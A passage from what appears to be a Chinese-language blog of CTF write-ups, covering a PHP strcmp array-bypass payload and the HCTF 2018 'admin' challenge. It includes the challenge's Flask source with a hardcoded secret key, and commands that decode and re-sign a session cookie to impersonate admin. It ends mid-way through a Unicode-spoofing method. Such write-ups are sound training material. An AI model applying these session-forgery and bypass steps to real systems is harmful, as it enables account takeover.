close</code></pre><p>果然是带cookie的，将cookie的值修改为1（都行）</p><p>构造payload</p><pre class=" language-php"><code class="language-php">password<span class="token operator">=</span>404a<span class="token operator">&amp;</span>money<span class="token operator">=</span><span class="token number">100000000</span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cFILFS.png" alt="cFILFS.png"></p><p>too long !!!!</p><p>应该是strcmp函数检测到了长度</p><p>money[]绕过</p><p>最终payload</p><pre class=" language-php"><code class="language-php">password<span class="token operator">=</span>404a<span class="token operator">&amp;</span>money<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">100000000</span>cookie<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token number">1</span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cFIxQs.png" alt="cFIxQs.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF_2018 admin</title>
      <link href="2021/03/27/hctf-2018-admin/"/>
      <url>2021/03/27/hctf-2018-admin/</url>
      
        <content type="html"><![CDATA[<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>进入页面，弱密码登录竟然成功了，得到了flag</p><p>还是看看这道题的考点</p><p>首页源代码中<code>&lt;!-- you are not admin --&gt;</code></p><p>想试试二次注入好像不行</p><p>随便注册一个账号登录</p><p>登录后<code>post</code>里面试一下xss，也不行</p><p>那就<code>change password</code>得到<code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</code></p><p>下载，好像是源码，python我也不太懂</p><p>接下来参考别人的wp</p><h4 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h4><p>123，哈哈</p><h3 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h3><p><code>index.html</code></p><pre class=" language-html"><code class="language-html"><span class="token entity" title="&#123;">&amp;#123;</span>% include('header.html') %<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#123;">&amp;#123;</span>% if current_user.is_authenticated %<span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hello <span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span> session['name'] <span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token entity" title="&#123;">&amp;#123;</span>% endif %<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#123;">&amp;#123;</span>% if current_user.is_authenticated and session['name'] == 'admin' %<span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hctf<span class="token entity" title="&#123;">&amp;#123;</span>xxxxxxxxx<span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token entity" title="&#123;">&amp;#123;</span>% endif %<span class="token entity" title="&#125;">&amp;#125;</span><span class="token comment" spellcheck="true">&lt;!-- you are not admin --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Welcome to hctf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token entity" title="&#123;">&amp;#123;</span>% include('footer.html') %<span class="token entity" title="&#125;">&amp;#125;</span></code></pre><p><code>&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;</code></p><p>这说的是传入的<code>seesion</code>=<code>admin</code>就会执行后面的，意思差不都是登录admin，显示flag</p><p><code>routes.py</code></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> logout_user<span class="token punctuation">,</span> LoginManager<span class="token punctuation">,</span> current_user<span class="token punctuation">,</span> login_user<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token punctuation">,</span> db<span class="token keyword">from</span> config <span class="token keyword">import</span> Config<span class="token keyword">from</span> app<span class="token punctuation">.</span>models <span class="token keyword">import</span> User<span class="token keyword">from</span> forms <span class="token keyword">import</span> RegisterForm<span class="token punctuation">,</span> LoginForm<span class="token punctuation">,</span> NewpasswordForm<span class="token keyword">from</span> twisted<span class="token punctuation">.</span>words<span class="token punctuation">.</span>protocols<span class="token punctuation">.</span>jabber<span class="token punctuation">.</span>xmpp_stringprep <span class="token keyword">import</span> nodeprep<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">from</span> code <span class="token keyword">import</span> get_verify_code@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 图片以二进制形式写入</span>    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 把buf_str作为response返回前端，并设置首部字段</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>    <span class="token comment" spellcheck="true"># 将验证码字符串储存在session中</span>    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code    <span class="token keyword">return</span> response@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'hctf'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> None <span class="token operator">or</span> <span class="token operator">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                flash<span class="token punctuation">(</span><span class="token string">'post successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'edit.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'edit'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>errorhandler<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    title <span class="token operator">=</span> unicode<span class="token punctuation">(</span>error<span class="token punctuation">)</span>    message <span class="token operator">=</span> error<span class="token punctuation">.</span>description    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'errors.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>flask是用python写的web框架，session以cookie形式存在客户端</p><p>接下来解码，再伪造session</p><p><img src="https://z3.ax1x.com/2021/03/29/c9EmwD.png" alt="c9EmwD.png"></p><p>拿到session</p><pre class=" language-http"><code class="language-http">session：.eJxFUM9rwjAU_lfGO3toQ70IXkatOHgvVNKGl4s4rbZp4qBV1Ij_-4Ib2_n7_T1gcxiasYXZebg0E9h0e5g94O0TZoCWU6nLK_rqjp4DWbKsyzvZPpOKnNRFT2IhZF5luOSb8ZyQLjyFtpXKucgLMi981AQMq4zVUVDeT03Od7YrQdZZ4xeB9fqHvzQew75F9eHJVkEuyykpvKEvE6ljdlhELSYm7wWHdWvUTlDYd6iqOTwnsBuHw-b81Tenvwmka4e6cLFChmqXGBXtremkNg5trGPfLfuiN7ZMWVWJ0euOr_OXXee3x-b_DFFn9S9y2voIQAoTuIzN8PoM0gSe3-wTbLg.YGAkfw.j_uEzvi-2vEKxpp7Xzgj-Iyw1bc</code></pre><p>还需要SECRET_KEY</p><p><code>config.py</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">'ckj123'</span>    SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:adsl1234@db:3306/test'</span>    SQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">True</span></code></pre><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">SECRET_KEY:</span>ckj123</code></pre><p>脚本：<a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder</a></p><p>跑一下，得到</p><pre class=" language-python"><code class="language-python">python flask_session_cookie_manager3<span class="token punctuation">.</span>py decode <span class="token operator">-</span>s ckj123 <span class="token operator">-</span>c <span class="token punctuation">.</span>eJxFUMFqwkAQ_ZUyZw9GzSXgQUgTFGZCwsZl9yLWxmQnuylERV3x37u10B4ew_B4b968B<span class="token operator">-</span>yOY3PqIDmPl2YCO_MJyQPePiAB5PJOEqeK3<span class="token operator">-</span>MiVbGSG4Mz6khsGblzStYzdFWHYhX_TO20wYBCVJbk<span class="token operator">-</span>oq5iimtWIn<span class="token operator">-</span>hrwOaO_kNlaJ4CMzq7iOtMuc8ngrpO606KyWlS0kOeJyXqSrK84yR6maY54Z8kEXNMQHrzjcyMPubY<span class="token operator">-</span><span class="token operator">-</span>XMJzAofTeNydv_pm<span class="token operator">-</span>HuB0nqBvJoG2UJLddOcGS23PabWkNQOfe9JtPcir2NiHaJlFsvly864fdv8lzFsBt3<span class="token operator">-</span>MsPeBQIimMDl1IyvziCawvMb0RFtXA<span class="token punctuation">.</span>YGBYaw<span class="token punctuation">.</span>SFJ0fvQ_rtos<span class="token operator">-</span>TSz52cCzIIkQVY<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'_fresh': True, '_id': b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34', 'csrf_token': b'458204258ef1f1beed09b5ff3935828e966ea1e1', 'image': b'2rgf', 'name': '1', 'user_id': '10'&amp;#125;</span></code></pre><p>将<code>name</code>的值改为<code>admin</code>,编码</p><pre class=" language-python"><code class="language-python">python flask3<span class="token punctuation">.</span>py encode <span class="token operator">-</span>s ckj123 <span class="token operator">-</span>t <span class="token string">"&amp;#123;'_fresh': True, '_id': b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34', 'csrf_token': b'458204258ef1f1beed09b5ff3935828e966ea1e1', 'image': b'2rgf', 'name': 'admin', 'user_id': '10'&amp;#125;"</span><span class="token punctuation">.</span>eJxFUMuKwkAQ_JWlzx7iIxfBg5BNUOgOCROHmYv4iMl0ZrIQFXXEf99ZF3YPRdMUVV1dT9iehvrcwvwyXOsRbM0R5k_42MMckIsHSYwUf8Z5omIl1wYn1JLYMHLrlKwm6MoWxTL<span class="token operator">-</span>mdppgwG5KC3J1Q0zFVNSshLdHXkV0DzIra0SwUemVnE11i51yuM9l7rVorValjaX5IiLaZ4sbzhJHSVqillqyAdd0BAfvOJwIwu7tx36YgGvERzOw2l7<span class="token operator">-</span>erq_u8FSqoZ8jIKspmW6q45NVpuOkysIakd<span class="token operator">-</span>s6TaB55VsXEOkRLLRaLt51xu6b<span class="token operator">-</span>L6Nf97r5ZfqdCwTsjs70MILruR7evcE4gtc3l5pvNA<span class="token punctuation">.</span>YGBhyg<span class="token punctuation">.</span>8mFsYTGotorfD6H7bsHdSTnxKQ4</code></pre><p>然后用burp抓包，传入修改的session，得到flag</p><p><img src="https://z3.ax1x.com/2021/03/29/c9EnTe.png" alt="c9EnTe.png"></p><h4 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h4><p>利用解码机制，传入一个非预期的值得到预期的结果</p><p>引用上面<code>routes.py</code></p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> None <span class="token operator">or</span> <span class="token operator">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods 